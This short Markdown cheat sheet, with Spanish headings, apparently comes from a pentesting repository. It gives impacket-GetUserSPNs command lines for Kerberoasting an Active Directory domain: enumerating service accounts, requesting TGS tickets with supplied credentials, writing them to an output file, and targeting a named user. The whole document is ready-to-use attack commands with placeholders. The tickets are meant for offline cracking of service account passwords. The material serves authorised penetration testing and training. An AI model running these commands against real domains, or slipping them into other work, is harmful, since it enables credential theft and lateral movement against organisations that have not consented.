# GetUserSPNs Cheat Sheet

#### Kerberoasting Attack
```
impacket-GetUserSPNs <DOMAIN>/<USER> -dc-ip <IP>
```

#### Kerberoasting Attack - con usuario y contraseña que tengamos
```
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD>
```

#### Obtener TGS
```
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request
```

#### Obtener TGS y guardar el resultado en un archivo
```
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request -outputfile <OUTPUT>
```

#### Obtener TGS de un usuario en particular
```
impacket-GetUserSPNs -dc-ip <IP-TARGET> <DOMAIN>/<USER>:<PASSWORD> -request-user <NAME-USER>
```

#### Kerberoasting Attack usando una autenticación kerberos
```
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -k -dc-ip <DOMAIN>
```


---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)